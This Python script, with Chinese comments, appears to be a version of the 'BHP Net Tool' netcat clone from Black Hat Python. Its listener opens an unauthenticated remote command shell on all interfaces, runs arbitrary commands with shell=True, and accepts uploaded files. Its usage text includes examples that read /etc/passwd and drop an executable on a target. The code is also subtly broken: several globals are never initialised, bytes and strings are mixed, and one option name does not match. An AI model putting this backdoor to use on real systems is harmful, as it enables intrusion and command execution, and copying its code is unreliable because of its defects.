# coding=utf-8

import sys
import socket
import getopt
import threading
import subprocess


def run_command(command):
    command = command.rstrip()

    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        output = b"Failed to execute command.\r\n"

    return output


def client_handler(client_socket):
    global upload
    global execute
    global command

    if len(upload_destination):
        file_buffer = ""

        # 循环接受客户端的内容
        while True:
            data = client_socket.recv(1024)

            if not data:
                break
            else:
                file_buffer += data

        # 还原文件
        try:
            with open(upload_destination, "wb") as file_descriptor:
                file_descriptor.write(file_buffer)
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)

    if len(execute):
        output = run_command(execute)
        client_socket.send(output)

    # 如果 command 为 1，则建立一个类似 Shell
    if command:
        # 接收客户端发送过来的命令，并返回执行结果
        while True:
            client_socket.send(b"<BHP:#> ")

            # 直到换行符，读入命令
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024).decode("utf-8")

            response = run_command(cmd_buffer)
            client_socket.send(response)


def server_loop():
    global target
    global port

    # 如果未设定目标，则监听全部接口
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket,))
        client_thread.start()


def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        client.connect((target, port))

        # 读入 buffer 并发送
        if len(buffer):
            client.send(buffer.encode("utf-8"))

        while True:
            recv_len = 1
            response = ""

            while recv_len:

                data = client.recv(4096)
                recv_len = len(data)
                response += data.decode("utf-8")

                if recv_len < 4096:  # 如果小于4096就表示数据已经接受完毕。
                    break

            print(response, end=" ")

            buffer = input("")
            buffer += "\n"

            client.send(buffer.encode("utf-8"))

    except Exception as e:
        print("[*] Exception! Exiting.")
    finally:
        client.close()


def usage():
    print("BHP Net Tool")
    print("Usage: bhpnet.py -t target_host -p port")
    print("\t-l --listen                - listen on [host]:[port] for incoming connections")
    print("\t-e --execute=file_to_run   - execute the given file upon receiving a connection")
    print("\t-c --command               - initialize a command shell")
    print("\t-u --upload=destination    - upon receiving connection upload a file and write to [destination]")
    print("Examples: ")
    print("\tbhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("\tbhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe")
    print("\tbhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    print("\techo 'ABCDEFGHI' | ./bhpnet.py -t 192.168.11.12 -p 135")
    sys.exit(0)


def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target

    # 参数不够打印 usage，sys.argv[0] 表示脚本名
    if not len(sys.argv[1:]):
        usage()

    # 解析命令行参数
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu:",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()

    # 取出成对的参数
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("-e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"

    if not listen and len(target) and port > 0:
        # 客户端从命令行读取缓冲区，如果不想阻塞在这，输入 CTRL-D
        buffer = sys.stdin.read()
        client_sender(buffer)

    # 启动监听即进入服务器循环中
    if listen:
        server_loop()


if __name__ == "__main__":
    main()
